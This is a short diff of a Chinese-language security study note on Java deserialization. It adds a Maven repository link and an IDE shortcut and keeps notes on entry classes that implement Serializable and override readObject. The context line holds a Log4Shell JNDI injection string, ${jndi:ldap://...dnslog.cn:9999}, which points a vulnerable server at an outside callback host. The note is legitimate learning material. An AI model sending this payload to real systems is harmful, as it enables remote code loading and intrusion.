@@ -532,6 +532,9 @@ ${jndi:ldap://wffsr5.dnslog.cn:9999}
 ## java反序列化
 #java反序列化 
 
+https://mvnrepository.com/  查找maven依赖
+`ctrl alt b`查找接口的实现
+
 入口类: 
 - 实现了serialize接口
 - 重写了readObject方法
